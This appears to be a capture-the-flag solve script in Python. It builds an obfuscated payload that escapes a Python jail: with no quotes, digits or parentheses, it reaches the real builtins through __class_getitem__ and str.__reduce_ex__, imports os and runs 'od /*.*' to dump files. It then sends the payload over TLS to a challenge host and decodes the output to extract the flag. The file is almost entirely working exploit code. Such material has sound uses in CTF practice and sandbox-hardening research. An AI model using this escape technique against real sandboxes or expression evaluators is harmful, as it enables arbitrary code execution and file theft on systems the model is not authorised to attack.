#!/usr/bin/env python3
import re
import socket
import ssl
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "CHALLENGE_HOST"

# Build the quote-, digit-, and parenthesis-free expression.  It creates a
# generic getattr trampoline through hint_A.__class_getitem__, obtains the real
# builtins through str.__reduce_ex__, imports os, and executes `od /*.*`.
inits = [
    't:=True','F:=False','a:=t+t','b:=a+t','c:=a+a','f:=b+c','g:=c+c','v:=b<<f-a','v:=v-t',
    'I:=hint_B[b]','O:=hint_B[g+c]','T:=hint_B[g+a]','M:=hint_B[::f]','n:=v>>t','H:=M%n',
    'n:=~-n','J:=M%n','n:=n-c','V:=M%n','n:=n-g-a','Q:=M%n','U:=M%v','v:=v+b','B:=M%v',
    'v:=v+a','D:=M%v','v:=-~v','E:=M%v','v:=v+g','K:=M%v','v:=v+f-a','R:=M%v',
    'v:=-~v','S:=M%v','v:=v+a','W:=M%v','v:=v+b',
    'x:=U*a+R+E+D+W+hint_B[f]+E+U+E+M%v+U*a',
    'y:=U*a+B+W+I+hint_B[c]+T+I+hint_B[-t]+S+U*a',
    'o:=U*a+I+K+hint_B[g]+O+R+T+U*a','w:=S+hint_B[~c]+S+T+E+K',
]
parts = [
    '{' + ','.join(inits) + '}',
    '{i:=~F for p in {lambda j:j.__getattribute__}for q in hint_B[:g+a]for globals[q]in{p}if[j:=p]}',
]
arg = '[hint_B,x,a,j,y,O+S,j,w,O+D+Q+H+V+J+V][i]'
call = 'hint_A[k] if i-c else hint_A[k][o]'
upd = '{None for globals[m if i%b-a else q] in {r}}'
outer = f'{{lambda A={{i:=i+t,k:={arg},r:={call},j:=r if i-a else r[F],m:=i>=c,m:=hint_B[i+t+m]}},E={upd}:r for q in globals for hint_A.__class_getitem__ in {{globals[q]}}}}'
payload = ','.join(parts + [outer])

assert len(payload) == 795
assert payload.count('.') == 2
assert re.fullmatch(r'^(?:[^\[\]"\'0-9()]+|\[[^\[\]"\'0-9()]*\])*$', payload)

ctx = ssl.create_default_context()
with ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST) as sock:
    sock.recv(4096)
    sock.sendall(payload.encode() + b'\n')
    out = b''
    while chunk := sock.recv(65536):
        out += chunk

print(out.decode(errors='replace'))

# Decode the default little-endian 16-bit octal output emitted by `od`.
words = re.findall(rb'(?m)^\d{7}((?: [0-7]{6})+)$', out)
if words:
    raw = b''.join(struct.pack('<H', int(w, 8)) for line in words for w in line.split())
    match = re.search(rb'pwnsec\{[^}\n]+\}', raw)
    if match:
        print('FLAG:', match.group().decode())
